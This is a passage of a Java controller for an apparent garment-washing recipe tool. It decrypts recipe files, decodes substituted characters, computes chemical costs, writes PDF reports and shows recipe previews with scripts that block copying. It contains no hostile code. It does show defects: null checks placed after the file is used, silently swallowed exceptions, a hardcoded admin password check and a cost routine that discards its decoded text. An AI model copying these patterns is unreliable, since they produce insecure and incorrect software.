      alerto.setGraphic(fss);
      alerto.setResizable(false);
      DialogPane dialogPaneo = alerto.getDialogPane();
      dialogPaneo.getStylesheets().add(
    getClass().getResource(getValueByKey(System.getProperty("user.home")+"\\setto.cfg", "Themes")).toExternalForm());
      Optional<ButtonType> optiono = alerto.showAndWait();
      String passy=fss.getText();
      if (optiono.get() == null) {} 
      else if (optiono.get() == ButtonType.OK) {
          if (passy.isEmpty()||passy.equals(" ")) {
              Notifications noti = Notifications.create();
              noti.title("Fatal Error!");
              noti.text("We Can't continue, Password is incorrect or empty.");
              noti.position(Pos.CENTER);
              noti.hideAfter(Duration.seconds(3));
              noti.showError();
          }
          else {
              //////////Code Here.......
              if (passy.equals(passwordyyy)) {
              Notifications noti = Notifications.create();
              noti.title("Great!");
              noti.text("Admin Opened.");
              noti.position(Pos.CENTER);
              noti.hideAfter(Duration.seconds(3));
              noti.showInformation();
              openadmin.setText("Close Admin");   
              }
              else {
              Notifications noti = Notifications.create();
              noti.title("Fatal Error!");
              noti.text("We Can't continue, Password is incorrect.");
              noti.position(Pos.CENTER);
              noti.hideAfter(Duration.seconds(3));
              noti.showError();
              }   
          }    
    } 
      else if (optiono.get() == ButtonType.CANCEL) {
      Notifications noti = Notifications.create();
      noti.title("Cancel!");
      noti.text("Operation Cancelled, Recipe wasn't edited.");
      noti.position(Pos.CENTER);
      noti.hideAfter(Duration.seconds(3));
      noti.showInformation();
      } else {}    
        }
        else { 
            openadmin.setText("Open Admin");   
        }
    } 
    
    
    
    
    
    @FXML
    void recipeprocessesaction(ActionEvent event) {
        //Open Recipe
        //Pull Data
        //Show Alert
        //Add To List
        //Click Create Button To Create A Recipe
        //Start.................................
      FileChooser fcho = new FileChooser();
      //fcho.getExtensionFilters().add(new FileChooser.ExtensionFilter("HTML Files", new String[]{"*.png"}));
      fcho.getExtensionFilters().add(new FileChooser.ExtensionFilter("KADYSOFT Files", new String[]{"*.ks"}));
      fcho.setTitle("Kady Choose");
      File f = fcho.showOpenDialog((Window)null);
      String dirpathe = f.getAbsolutePath().toString();
       ///Decrypt////////////////////////////////////
           try { 
               
              
              ////////////////////////////////////////////////////////////

    String longKey;
    try (BufferedReader cxsd = new BufferedReader(new FileReader("lib\\java.dat"))) {
        longKey = cxsd.readLine();
    }
    if (longKey == null || longKey.trim().isEmpty()) {
        Notifications noti = Notifications.create();
        noti.title("Fatal Error!");
        noti.text("java.dat is empty!");
        noti.position(Pos.CENTER);
        noti.hideAfter(Duration.seconds(4));
        noti.showError();
        return;
    }
    String result = KeyDecoder.extractData(longKey.trim());
    if (f == null) {
        Notifications noti = Notifications.create();
        noti.title("Fatal Error!");
        noti.text("Choose file first!");
        noti.position(Pos.CENTER);
        noti.hideAfter(Duration.seconds(4));
        noti.showError();
        return;
    }
    String input = f.getAbsolutePath();
    String nameofit=f.getName();
    String tempOutput = System.getProperty("user.home")+"\\"+nameofit;
 
    FileDecryptor.decrypt(input, tempOutput, result);
    File tempb = new File(tempOutput);
    
    ////////////////////////////////////////////////////////////
               
               
               
    coode.clear();
    InputStream inputinstream=new FileInputStream(tempb);
    BufferedReader bi=new BufferedReader (new InputStreamReader (inputinstream,"UTF-8"));
    String lo;
    while ((lo=bi.readLine())!=null) {
        coode.appendText("\n"+lo
       .replace("ﬦ","A")
       .replace("ﬧ","B")
       .replace("ﬨ","C")
       .replace("﬩","D")
       .replace("שׁ","E")    
       .replace("שׂ","F")        
       .replace("שּׁ","G")         
       .replace("שּׂ","H")         
       .replace("אַ","I")         
       .replace("אָ","J")         
       .replace("אּ","K")         
       .replace("בּ","L")         
       .replace("גּ","M")         
       .replace("דּ","N")         
       .replace("הּ","O")         
       .replace("וּ","P")         
       .replace("זּ","Q")         
       .replace("טּ","R")         
       .replace("יּ","S")         
       .replace("ךּ","T")         
       .replace("כּ","U")         
       .replace("לּ","V")
       .replace("מּ","W")         
       .replace("נּ","X")         
       .replace("סּ","Y")         
       .replace("ףּ","Z")         
       .replace("פּ","0")         
       .replace("צּ","1")         
       .replace("קּ","2")         
       .replace("רּ","3")         
       .replace("שּ","4")         
       .replace("תּ","5")         
       .replace("וֹ","6")         
       .replace("בֿ","7")         
       .replace("כֿ","8")
       .replace("פֿ","9")
       .replace("&NBSP;","")               
      ); 
    }
    bi.close();
    
    	
    ////////////////////////////////////////////////////////////////
    if (tempb.exists()) {
        tempb.delete();
    }
    ////////////////////////////////////////////////////////////////
    
    
        }catch (Exception g) {}
       String stages=null;
       int bathnumzzz=0;
       String modu,comment;
        int ds=1;
                            Document docy = Jsoup.parse(coode.getText());
                            for (Element table : docy.select("table")) {
                            for (Element row : table.select("tr")) {
                            Elements tds = row.select("td");
                            if (tds.get(3).text().contains("/")||tds.get(3).text().contains("\\")||tds.get(3).text().isEmpty()||tds.get(3).text().contains("TEMP")||tds.get(3).text().contains("OPERATOR")||tds.get(3).text().contains("temp")||tds.get(3).text().contains("operator")/*||tds.get(3).text().contains("extract")||tds.get(3).text().contains("EXTRACT")||tds.get(3).text().contains("extraction")||tds.get(3).text().contains("EXTRACTION")*/||tds.get(3).text().matches("[0-9]+")||tds.get(3).text().contains("REMOV")||tds.get(3).text().contains("REMOVE")||tds.get(3).text().contains("BATH")||tds.get(3).text().contains("SAME")||tds.get(3).text().contains("PATH")||tds.get(3).text().contains("SAM")||tds.get(3).text().contains("RPM")||tds.get(3).text().contains("KG")||tds.get(3).text().contains("PCS")||tds.get(3).text().contains("DRAIN")||tds.get(3).text().contains("RIMOV")||tds.get(3).text().contains("RIMOVE")) {}
                            else {
                            String tempo=tds.get(3).text();
                            if (tempo.contains("EXTRACT")||tempo.contains("Extract")||tempo.contains("extract")) {
                                stages=stages+"\n"+"WASHING "+Integer.toString(ds++);
                            }
                            else {
                                stages=stages+"\n"+tempo;
                            }
                            }
                           }}
        String arabicRegex = "[\\u0600-\\u06FF]+";
        Pattern pattern = Pattern.compile(arabicRegex);
        Matcher matcher = pattern.matcher(stages+"");
        String modifiedLine = matcher.replaceAll("\n");
        String lone=modifiedLine.replace("null","\n");
        
        StringBuilder result = new StringBuilder();
        String[] lines = lone.split("\n");
        for (String line : lines) {
            if (!line.trim().isEmpty()) {
                result.append(line).append("\n");
            }
        }
            JFXTextArea kk=new JFXTextArea ();
            kk.setStyle("-fx-font-weight:bold;");
            kk.setEditable(true);
            kk.setText(result+"");
            Alert al=new Alert (Alert.AlertType.ERROR);
            al.setTitle("Recipe Viewer");
            al.setHeaderText("Here is your recipe Stages: ");
            al.setContentText("Please edit me if you found errors, iam not a human. Iam a computer\nMy developer is KADINIO.");
            al.setResizable(false);
            al.setGraphic(kk);
            DialogPane dialogPane = al.getDialogPane();
            dialogPane.getStylesheets().add(
          getClass().getResource(getValueByKey(System.getProperty("user.home")+"\\setto.cfg", "Themes")).toExternalForm());
            al.showAndWait(); 
    }

    
    
    
    
   @FXML
  void timeraction (ActionEvent event) throws IOException {
    Stage stg = new Stage();
    Parent root = FXMLLoader.<Parent>load(getClass().getResource("Reports.fxml"));
    Scene sce = new Scene(root);
    //////////////////////////////Theme////////////////////////////////
    String themooo=getValueByKey(System.getProperty("user.home")+"\\setto.cfg", "Themes");
    // Check if CSS exists
    URL cssUrl = getClass().getResource(themooo);
    if (cssUrl == null) {
        System.err.println("ERROR: cupertino-dark.css not found in same package as controller!");
    } else {
        // Apply theme to both scene and root (ensures it always works)
        String cssPath = cssUrl.toExternalForm();
        sce.getStylesheets().add(cssPath);
        root.getStylesheets().add(cssPath);
    }
    ////////////////////////////////////////////////////////////////////
    stg.setTitle("Create Report");
    stg.setResizable(true);
    stg.setMaximized(true);
    stg.setScene(sce);
    stg.centerOnScreen();
    stg.getIcons().add(new javafx.scene.image.Image(Main.class.getResourceAsStream("washing.png")));
    stg.show();    
  }
  
  
  
  
  
  @FXML
  void costeraction (ActionEvent event) throws IOException, Exception { 
///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////   
FileChooser fcho = new FileChooser();
fcho.getExtensionFilters().add(new FileChooser.ExtensionFilter("Kadysoft Files", new String[] { "*.ks" }));
fcho.getExtensionFilters().add(new FileChooser.ExtensionFilter("HTML Files", new String[] { "*.html" }));
fcho.setTitle("Kady Choose");
File f = fcho.showOpenDialog((Window)null);
String recipenami=f.getName().replace(".ks","").replace(".html","");
String recipepathy = f.getAbsolutePath().toString();

String didd1=NewDir.file_dir+"\\PRODUCTION\\";
String didd2="\\"+f.getName();

String modelooo=recipepathy.replace(didd1,"").replace(didd2,"");


    ////////////////////////////////////////////////////////////

    String longKey;
    try (BufferedReader cxsd = new BufferedReader(new FileReader("lib\\java.dat"))) {
        longKey = cxsd.readLine();
    }
    if (longKey == null || longKey.trim().isEmpty()) {
        Notifications noti = Notifications.create();
        noti.title("Fatal Error!");
        noti.text("java.dat is empty!");
        noti.position(Pos.CENTER);
        noti.hideAfter(Duration.seconds(4));
        noti.showError();
        return;
    }
    String resultg = KeyDecoder.extractData(longKey.trim());
    if (f == null) {
        Notifications noti = Notifications.create();
        noti.title("Fatal Error!");
        noti.text("Choose file first!");
        noti.position(Pos.CENTER);
        noti.hideAfter(Duration.seconds(4));
        noti.showError();
        return;
    }
    String input = f.getAbsolutePath();
    String nameofit=f.getName();
    String tempOutput = System.getProperty("user.home")+"\\"+nameofit;
 
    FileDecryptor.decrypt(input, tempOutput, resultg);
    File tempg = new File(tempOutput);
    
    ////////////////////////////////////////////////////////////


//////////////////////////////////////////////////////////////////////////////////////////////////////////
InputStream inputinstream=new FileInputStream(tempg);
BufferedReader bi=new BufferedReader (new InputStreamReader (inputinstream,"UTF-8"));
String lo;
coode.clear();
while ((lo=bi.readLine())!=null) {  lo   
.replace("ﬨ","C")
.replace("﬩","D")
.replace("שׁ","E")    
.replace("שׂ","F")        
.replace("שּׁ","G")         
.replace("שּׂ","H")         
.replace("אַ","I")         
.replace("אָ","J")         
.replace("אּ","K")         
.replace("בּ","L")         
.replace("גּ","M")         
.replace("דּ","N")         
.replace("הּ","O")         
.replace("וּ","P")         
.replace("זּ","Q")         
.replace("טּ","R")         
.replace("יּ","S")         
.replace("ךּ","T")         
.replace("כּ","U")         
.replace("לּ","V")
.replace("מּ","W")         
.replace("נּ","X")         
.replace("סּ","Y")         
.replace("ףּ","Z")         
.replace("פּ","0")         
.replace("צּ","1")         
.replace("קּ","2")         
.replace("רּ","3")         
.replace("שּ","4")         
.replace("תּ","5")         
.replace("וֹ","6")         
.replace("בֿ","7")         
.replace("כֿ","8")
.replace("פֿ","9")
.replace("&NBSP;","");
}
bi.close();

    ////////////////////////////////////////////////////////////////
    if (tempg.exists()) {
        tempg.delete();
    }
    ////////////////////////////////////////////////////////////////

String gf=coode.getText();
OutputStream instreamm=new FileOutputStream(System.getProperty("user.home")+"\\r.ks");
PrintWriter pwe = new PrintWriter(new OutputStreamWriter (instreamm,"UTF-8"));
pwe.println(gf);
pwe.close();
///////////////////////////////////////////////////////////////////////////////////////////////////////////   
List<Double> pri = new ArrayList<>();
List<Double> qua = new ArrayList<>();
List<Double> dil = new ArrayList<>();
List<String> nom = new ArrayList<>();

////////////////////////////////////////////////
File inputFile = new File(System.getProperty("user.home")+"\\r.ks"); //
org.jsoup.nodes.Document docj = Jsoup.parse(inputFile, "UTF-8"); //
//Document docj = Jsoup.parse(codee);
for (Element table : docj.select("TABLE")) {
for (Element row : table.select("TR")) {
Elements tds = row.select("TD");
if (tds.get(8).text().isEmpty()||tds.get(8).text().contains("OLD STONE")) {   
}
else { 
String string = tds.get(8).text();
BufferedReader buf = new BufferedReader(new FileReader(NewDir.file_dirrrr + "\\Recipe_Indexes\\Prices.kady"));
String line;
String linebeforeequal;
String lineafterequal;
boolean found = false;
while ((line = buf.readLine()) != null) {
linebeforeequal = line.substring(0, line.indexOf("=$"));  // Item
lineafterequal = line.substring(line.indexOf("=$") + 2);  // Price
if (string.equals(linebeforeequal)) {
    System.out.println(linebeforeequal);
double number1 = Double.parseDouble(lineafterequal);
pri.add(number1);
String itaam = linebeforeequal;
nom.add(itaam);
found = true;
break;
}
}
// If the item wasn't found in the file, add it to the except variable
//if (!found) {
//except = except + "\n" + tds.get(7).text();
//}
buf.close();   
//String string=tds.get(8).text();
//BufferedReader buf=new BufferedReader (new FileReader (NewDir.file_dirrrr + "\\Recipe_Indexes\\Prices.kady"));
//String line;
//String linebeforeequal;
//String lineafterequal;
//while ((line=buf.readLine())!=null) {       
//linebeforeequal=line.substring(0,line.indexOf("=$")-0);  //Item
//lineafterequal=line.substring(line.indexOf("=$") + 2 , line.length());  //Price
//if (string.equals(linebeforeequal)) {
//double number1 = Double.parseDouble(lineafterequal);
//pri.add(number1);
//String itaam = linebeforeequal;
//nom.add(itaam);
//break;
//}
//else {
//except=except+"\n"+tds.get(7).text();    
//}
//}
//buf.close();



}          
//////////////////////KG//////////////////////////
String skip=tds.get(8).text();
if (skip.equals("OLD STONE")) {   
}
else {
if (tds.get(5).text().isEmpty()||tds.get(5).text().contains("/")||tds.get(5).text().contains("\\")||tds.get(5).text().contains("OPERATPR")||tds.get(5).text().contains("OPERATOR")||tds.get(5).text().contains("AMOUNT")||tds.get(5).text().contains("AMT")||tds.get(5).text().contains("-")||tds.get(5).text().contains("DATE")||tds.get(5).text().contains("WASH")||tds.get(5).text().contains("WASH NAME")) {}
else if (tds.get(6).text().contains("GR")||tds.get(6).text().contains("Gr")||tds.get(6).text().contains("gr")) {
double am=(Double.parseDouble(tds.get(5).text().replace(",","."))/1000);
String amm=Double.toString(am);
if (amm.contains("E")) { 
BigDecimal bd = new BigDecimal(amm);
double val = bd.doubleValue();
qua.add(val);   
}
else {
qua.add(am);
}
}

else if (tds.get(6).text().contains("GARDAL")||tds.get(6).text().contains("GARDEL")
||tds.get(6).text().contains("Gardal")||tds.get(6).text().contains("Gardel")||tds.get(6).text().contains("gardal")||tds.get(6).text().contains("gardel")) {
String sky=tds.get(8).text();
if (sky.equals("FOAM")) {
double am=4.0/5.0;
qua.add(am);   
}
else {
double am=Double.parseDouble(tds.get(5).text().replace(",","."))*12;
qua.add(am);    
}
}
else {
double number2 = Double.parseDouble(tds.get(5).text());
qua.add(number2);
}    
}
//////////////////////////////////////////////
if (tds.get(8).text().isEmpty()||tds.get(8).text().contains("/")||tds.get(8).text().contains("\\")||tds.get(8).text().contains("CHEMICAL")||tds.get(8).text().contains("chemical")||tds.get(8).text().matches("[0-9_-]+")||tds.get(8).text().contains("TIME")||tds.get(8).text().contains("HOURS")||tds.get(8).text().contains("MINS")||tds.get(8).text().contains("SHOT")||tds.get(8).text().contains("OLD STONE")) {    
}
else {  
String string = tds.get(8).text();
BufferedReader buf = new BufferedReader(new FileReader(NewDir.file_dirrrr + "\\Recipe_Indexes\\Dilution.kady"));
String line;
boolean found = false;
while ((line = buf.readLine()) != null) {
String linebeforeequal = line.substring(0, line.indexOf("=")).trim();  // Item
String lineafterequal = line.substring(line.indexOf("=") + 1).trim();  // Dilution
if (string.equals(linebeforeequal)) {
double number3 = Double.parseDouble(lineafterequal);
dil.add(number3);
found = true;
break;
}
}
if (!found) {
double number3 = Double.parseDouble("1.0");
dil.add(number3);
}
buf.close();
}
///////////////////////////////////////////////
}}    
if (qua.size()!=pri.size()||qua.size()!=dil.size()) { 
Notifications noti = Notifications.create();
noti.title("Fatal Error!");
noti.text("We found that all chemicals names weren't set.\nWe suggest to fix chemicals again.");
noti.position(Pos.CENTER);
noti.hideAfter(Duration.seconds(10));
noti.showError();
}
else {
    
    
//Show alert to write pcs.    
List<Double> result = new ArrayList<>();
for (int i = 0; i < qua.size(); i++) {
result.add((qua.get(i) / dil.get(i))* pri.get(i));
}
double sum = 0.0;
for (double number : result) {
sum += number;
}


////////////////////////////////////////////////////////////////////////////////////////////
            // Parse the HTML file
            org.jsoup.nodes.Document docv = Jsoup.parse(inputFile, "UTF-8");
            // Find all table rows
            Elements rows = docv.select("tr");
            boolean pcsFound = false;
            for (Element row : rows) {
                Elements cells = row.select("td");
                for (int i = 0; i < cells.size(); i++) {
                    if ("PCS".equalsIgnoreCase(cells.get(i).text().trim())) {
                        if (i + 1 < cells.size()) {
                            String nextValue = cells.get(i + 1).text().trim();
                            System.out.println("Next value after PCS: " + nextValue);
                            pecoco=nextValue;
                        } else {
                            System.out.println("PCS found but no next cell.");
                            pecoco="120";
                        }
                        pcsFound = true;
                        break;
                    }
                    else if (cells.get(i).text().trim().contains("PCS")) {
                        if (i + 1 < cells.size()) {
                            String nextValue = cells.get(i + 1).text().trim();
                            System.out.println("Next value after PCS: " + nextValue);
                            pecoco=nextValue;
                        } else {
                            System.out.println("PCS found but no next cell.");
                            pecoco="120";
                        }
                        pcsFound = true;
                        break;
                    }
                }

                if (pcsFound) break;
            }

            if (!pcsFound) {
                System.out.println("PCS not found");
                pecoco="";
            }
/////////////////////////////////////////////////////////////////////////////////////////////
JFXTextField grr = new JFXTextField(pecoco);
grr.setStyle("-fx-font-size:15;-fx-font-weight:bold;");
grr.setLabelFloat(true);
grr.setPromptText("Add PCS Number ...");
grr.setMinSize(300.0D, 25.0D);
Alert aloo = new Alert(Alert.AlertType.INFORMATION);
aloo.setTitle("PCS Number?");
aloo.setGraphic((Node)grr);
aloo.setResizable(false);
DialogPane dialogPane = aloo.getDialogPane();
dialogPane.getStylesheets().add(
getClass().getResource("cupertino-light.css").toExternalForm());
aloo.showAndWait();
double pcsnum=Double.parseDouble(grr.getText()+".0");
double onegar=sum/pcsnum;

Alert alertd = new Alert(Alert.AlertType.CONFIRMATION);
alertd.setTitle("Save To DB");
alertd.setHeaderText("Cost Result");
alertd.setContentText("Here Is The result of Cost For "+recipenami+" Recipe.");
ButtonType buttonTypeCanceld = new ButtonType("Cancel");
alertd.getButtonTypes().setAll( buttonTypeCanceld);
DialogPane dialogPaneid = alertd.getDialogPane();
dialogPaneid.getStylesheets().add(getClass().getResource("cupertino-light.css").toExternalForm());
Optional<ButtonType> resultsd = alertd.showAndWait();

Alert alert = new Alert(Alert.AlertType.CONFIRMATION);
alert.setTitle("Result");
alert.setHeaderText("Cost Result");
alert.setContentText("Here is the result of chemicals costs for one garment  :   "+Double.toString(onegar)+"   $.");
ButtonType buttonTypeOne = new ButtonType("Report");
ButtonType buttonTypeCancel = new ButtonType("Cancel");
alert.getButtonTypes().setAll(buttonTypeOne, buttonTypeCancel);
DialogPane dialogPanei = alert.getDialogPane();
dialogPanei.getStylesheets().add(getClass().getResource("cupertino-light.css").toExternalForm());
Optional<ButtonType> results = alert.showAndWait();
if (results.isPresent() && results.get() == buttonTypeOne) {
//Create Report.  (PDF)
    ////////////////////////////Start Report//////////////////////////////
    Date currentDate = GregorianCalendar.getInstance().getTime();
    DateFormat df = DateFormat.getDateInstance();
    String dateString = df.format(currentDate);
    Date d = new Date();
    SimpleDateFormat sdf = new SimpleDateFormat("yyyy-MM-dd");
    String timeString = sdf.format(d);
    String value0 = timeString;
    String value00 = value0.replace("/", "_");
    String repname = "Chemical_Report_Of_"+recipenami;
    String reppath = System.getProperty("user.home") + "\\Desktop";
    FileChooser dialog = new FileChooser();
    dialog.setInitialDirectory(new File(reppath));
    dialog.setInitialFileName(repname);
    dialog.getExtensionFilters().add(new FileChooser.ExtensionFilter("PDF Files", new String[] { "*.pdf" }));
    File dialogResult = dialog.showSaveDialog(null);
    String filePath = dialogResult.getAbsolutePath().toString();
    try {
      com.itextpdf.text.Document myDocument = new com.itextpdf.text.Document();
      PdfWriter myWriter = PdfWriter.getInstance(myDocument, new FileOutputStream(filePath));
      PdfPTable table = new PdfPTable(5);
      table.size();
      //table.setHorizontalAlignment(1);
      myDocument.open();
      float[] columnWidths = { 15.0F, 15.0F,15.0F,15.0F,15.0F };
      table.setWidths(columnWidths);
      table.setWidthPercentage(100.0F);
      myDocument.add((com.itextpdf.text.Element)new Paragraph("Cost Report For "+recipenami+" Recipe. ", FontFactory.getFont("Times-Bold", 12.0F, 1)));
      myDocument.add((com.itextpdf.text.Element)new Paragraph("-------------------------------------------------------------------------------------------"));
      table.addCell(new PdfPCell((Phrase)new Paragraph("Name", FontFactory.getFont("Times-Roman", 10.0F, 1))));
      table.addCell(new PdfPCell((Phrase)new Paragraph("Quantity", FontFactory.getFont("Times-Roman", 10.0F, 1))));
      table.addCell(new PdfPCell((Phrase)new Paragraph("Dilution", FontFactory.getFont("Times-Roman", 10.0F, 1))));
      table.addCell(new PdfPCell((Phrase)new Paragraph("Price", FontFactory.getFont("Times-Roman", 10.0F, 1))));
      table.addCell(new PdfPCell((Phrase)new Paragraph("Total", FontFactory.getFont("Times-Roman", 10.0F, 1))));
      int no=0;
      int stageno=1;
      while (no<qua.size()) {                                                                                                                
      table.addCell(new PdfPCell((Phrase)new Paragraph(nom.get(no), FontFactory.getFont("Times-Roman", 8.0F, 0))));
      table.addCell(new PdfPCell((Phrase)new Paragraph(Double.toString(qua.get(no)), FontFactory.getFont("Times-Roman", 8.0F, 0))));
      table.addCell(new PdfPCell((Phrase)new Paragraph(Double.toString(dil.get(no)), FontFactory.getFont("Times-Roman", 8.0F, 0))));
      table.addCell(new PdfPCell((Phrase)new Paragraph(Double.toString(pri.get(no)), FontFactory.getFont("Times-Roman", 8.0F, 0))));
      table.addCell(new PdfPCell((Phrase)new Paragraph(Double.toString((qua.get(no)/dil.get(no))*pri.get(no)), FontFactory.getFont("Times-Roman", 8.0F, 0))));
      no++;
      } 
      myDocument.add((com.itextpdf.text.Element)table);
      myDocument.add((com.itextpdf.text.Element)new Paragraph("-------------------------------"));
      myDocument.add((com.itextpdf.text.Element)new Paragraph("Total Of Cost (New) :    "+Double.toString(sum)+"          $.", FontFactory.getFont("Times-Bold", 10.0F, 1)));
      myDocument.add((com.itextpdf.text.Element)new Paragraph("Total Of Garments (New) :    "+Double.toString(pcsnum)+"          PCS.", FontFactory.getFont("Times-Bold", 10.0F, 1)));
      myDocument.add((com.itextpdf.text.Element)new Paragraph("One Garment Costs (New) :    "+Double.toString(onegar)+"          $.", FontFactory.getFont("Times-Bold", 10.0F, 1)));
      myDocument.add((com.itextpdf.text.Element)new Paragraph("-------------------------------"));
      myDocument.setPageSize(PageSize.A4.rotate());
      myDocument.close();
      Alert alooo = new Alert(Alert.AlertType.CONFIRMATION);
      alooo.setTitle("Info");
      alooo.setHeaderText("Info!");
      alooo.setContentText("Report was generated successfully");
      alooo.setResizable(true);
      DialogPane dialogPaneu = alooo.getDialogPane();
      dialogPaneu.getStylesheets().add(
      getClass().getResource("cupertino-light.css").toExternalForm());
      alooo.showAndWait();
    } catch (Exception e) {
    } finally {
      try {
      } catch (Exception e) {
      } 
    } 
    Desktop de = Desktop.getDesktop();
    de.open(new File(reppath + "\\" + repname + ".pdf"));
    ////////////////////////////End Report////////////////////////////////
} 
else {}
}   


  }
  
  
  
  
  
  @FXML
    void tableeaction(MouseEvent event) throws IOException, InterruptedException, Exception {
        String wsa=link.getText();
        if (!wsa.contains(".ks")) {
        //Noti to choose one first
        Image img = new Image(getClass().getResourceAsStream("kadysoft.png"));
        ImageView imgview = new ImageView();
        imgview.setImage(img);
        Notifications noti = Notifications.create();
        noti.title("Error");
        noti.text("I can't find the recipe, please choose one first.");
        noti.graphic(imgview);
        noti.position(Pos.CENTER);
        noti.show(); 
        }
        else {
      String pathy = link.getText().replace("\\","\\\\").replace("Z:",letterr+":").replace("X:",letterr+":").replace("V:",letterr+":").replace("W:",letterr+":");
      File op = new File(pathy);
      if (!op.exists()) {
        Image img = new Image(getClass().getResourceAsStream("kadysoft.png"));
        ImageView imgview = new ImageView();
        imgview.setImage(img);
        Notifications noti = Notifications.create();
        noti.title("Error");
        noti.text("I can't find the recipe, maybe KADINIO has deleted or encrypted it.");
        noti.graphic(imgview);
        noti.position(Pos.CENTER);
        noti.show();
      } else {
          File on1=new File (System.getProperty("user.home")+"\\Hehehe");
          if (!on1.exists()) {
              on1.mkdir();
          }
          else {   
          }
          File tw2o=new File (System.getProperty("user.home")+"\\Hehehe\\Roro.html");
          if (!tw2o.exists()) {
              tw2o.createNewFile();
          }
          else {      
          }
          
          
              ////////////////////////////////////////////////////////////

    String longKey;
    try (BufferedReader cxsd = new BufferedReader(new FileReader("lib\\java.dat"))) {
        longKey = cxsd.readLine();
    }
    if (longKey == null || longKey.trim().isEmpty()) {
        Notifications noti = Notifications.create();
        noti.title("Fatal Error!");
        noti.text("java.dat is empty!");
        noti.position(Pos.CENTER);
        noti.hideAfter(Duration.seconds(4));
        noti.showError();
        return;
    }
    String result = KeyDecoder.extractData(longKey.trim());
    if (op == null) {
        Notifications noti = Notifications.create();
        noti.title("Fatal Error!");
        noti.text("Choose file first!");
        noti.position(Pos.CENTER);
        noti.hideAfter(Duration.seconds(4));
        noti.showError();
        return;
    }
    String input = op.getAbsolutePath();
    String nameofit=op.getName();
    String tempOutput = System.getProperty("user.home")+"\\"+nameofit;
    FileDecryptor.decrypt(input, tempOutput, result);
    File temp = new File(tempOutput);
    
    ////////////////////////////////////////////////////////////
          
          
          
    coode.clear();
    InputStream inputinstream=new FileInputStream(temp);
    BufferedReader bi=new BufferedReader (new InputStreamReader (inputinstream,"UTF-8"));
    String lo;
    while ((lo=bi.readLine())!=null) {
        coode.appendText("\n"+lo
       .replace("ﬦ","A")
       .replace("ﬧ","B")
       .replace("ﬨ","C")
       .replace("﬩","D")
       .replace("שׁ","E")    
       .replace("שׂ","F")        
       .replace("שּׁ","G")         
       .replace("שּׂ","H")         
       .replace("אַ","I")         
       .replace("אָ","J")         
       .replace("אּ","K")         
       .replace("בּ","L")         
       .replace("גּ","M")         
       .replace("דּ","N")         
       .replace("הּ","O")         
       .replace("וּ","P")         
       .replace("זּ","Q")         
       .replace("טּ","R")         
       .replace("יּ","S")         
       .replace("ךּ","T")         
       .replace("כּ","U")         
       .replace("לּ","V")
       .replace("מּ","W")         
       .replace("נּ","X")         
       .replace("סּ","Y")         
       .replace("ףּ","Z")         
       .replace("פּ","0")         
       .replace("צּ","1")         
       .replace("קּ","2")         
       .replace("רּ","3")         
       .replace("שּ","4")         
       .replace("תּ","5")         
       .replace("וֹ","6")         
       .replace("בֿ","7")         
       .replace("כֿ","8")
       .replace("פֿ","9")
       .replace("&NBSP;","")              
      ); 
    }
    bi.close();
    
    ////////////////////////////////////////////////////////////////
    if (temp.exists()) {
        temp.delete();
    }
    ////////////////////////////////////////////////////////////////
    
    String gf=coode.getText();
    OutputStream instreamm=new FileOutputStream(tw2o);
    PrintWriter pwe = new PrintWriter(new OutputStreamWriter (instreamm,"UTF-8"));
    pwe.println(gf);
    pwe.println("<style>\n" +
"        body {\n" +
"            user-select: none;\n" +
"            -webkit-user-select: none;\n" +
"            -moz-user-select: none;\n" +
"            -ms-user-select: none;\n" +
"        }\n" +
"    </style>"
            
          +"<script>\n" +
"        document.addEventListener('dragstart', function(event) {\n" +
"            event.preventDefault();\n" +
"        });\n" +
"\n" +
"        document.addEventListener('drop', function(event) {\n" +
"            event.preventDefault();\n" +
"        });\n" +
"\n" +
"        document.addEventListener('contextmenu', function(event) {\n" +
"            event.preventDefault();\n" +
"        });\n" +
"    </script>"  
            
            + "<script>\n" +
"  \n" +
"  window.addEventListener(`contextmenu`, (e) => {\n" +
"    e.preventDefault();\n" +
"});\n" +
"  \n" +
"  </script>"
             + ""
            + "\n<meta charset=\"UTF-8\"/>\n<meta name=\"viewport\" content=\"width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0\"/>\n\t\t<meta http-equiv=\"X-UA-Compatible\" content=\"ie=edge\" />"
            + ""
            + "<script>\n" +
"            \n" +
"            document.addEventListener('keydown', event => {\n" +
"  console.log(`User pressed: ${event.key}`);\n" +
"  event.preventDefault();\n" +
"  return false;\n" +
"});\n" +
"            \n" +
"            </script>"
            
       +"<script>\n" +
"        document.addEventListener('keydown', function (event) {\n" +
"            // Disable specific keys or key combinations\n" +
"            event.preventDefault();\n" +
"        });\n" +
"    </script>");
    pwe.close();
    coode.clear();
       // إنشاء WebView وتحميل ملف HTML محلي
        WebView webviewt = new WebView();
        webviewt.setContextMenuEnabled(false);
        webviewt.setMinSize(1800, 800);
        webviewt.setZoom(1.0); // التكبير الافتراضي 100%
        String lkd = System.getProperty("user.home") + "\\Hehehe\\Roro.html";
        URI uris = Paths.get(lkd).toAbsolutePath().toUri();
        webviewt.getEngine().load(uris.toString());
        // سلايدر للتحكم في الزوم من 10% إلى 200%
        Slider zoomSlider = new Slider(0.1, 2.0, 1.0);
        zoomSlider.setShowTickLabels(true);
        zoomSlider.setShowTickMarks(true);
        zoomSlider.setMajorTickUnit(0.5);
        zoomSlider.setMinorTickCount(4);
        zoomSlider.setBlockIncrement(0.1);
        Label zoomLabel = new Label("Zoom: 100%");
        zoomSlider.valueProperty().addListener((obs, oldVal, newVal) -> {
            double zoom = newVal.doubleValue();
            webviewt.setZoom(zoom);
            zoomLabel.setText(String.format("Zoom: %.0f%%", zoom * 100));
        });
        // VBox يحتوي على WebView والسلايدر
        VBox vbox = new VBox();
        vbox.setPadding(new Insets(10));
        VBox.setVgrow(webviewt, Priority.ALWAYS);
        vbox.getChildren().addAll(webviewt, zoomLabel, zoomSlider);
        // وضع VBox داخل GridPane
        GridPane gridpane = new GridPane();
        gridpane.setStyle("-fx-font-family: 'Cairo SemiBold';");
        gridpane.setPadding(new Insets(10));
        gridpane.setAlignment(Pos.CENTER);
        gridpane.add(vbox, 0, 0);
        // إنشاء Alert لعرض المحتوى
        Alert alol = new Alert(Alert.AlertType.INFORMATION);
        alol.setTitle("Preview a recipe");
        DialogPane dialogPane = alol.getDialogPane();
        dialogPane.setContent(gridpane);
        dialogPane.getStylesheets().add(getClass().getResource(getValueByKey(System.getProperty("user.home")+"\\setto.cfg", "Themes")).toExternalForm());
